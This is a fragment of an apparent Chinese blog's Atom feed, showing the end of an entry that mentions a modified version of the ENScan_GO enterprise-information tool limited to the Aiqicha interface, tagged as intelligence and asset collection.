对&#x2F;wgpsec&#x2F;ENScan_GO的修改，只保留了爱企查接口，支持对外投资企业和子公司递归</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="情报" scheme="http://example.com/categories/%E6%83%85%E6%8A%A5/"/>
    
    
    <category term="资产收集" scheme="http://example.com/tags/%E8%B5%84%E4%BA%A7%E6%94%B6%E9%9B%86/"/>
    
  </entry>
  
</feed>
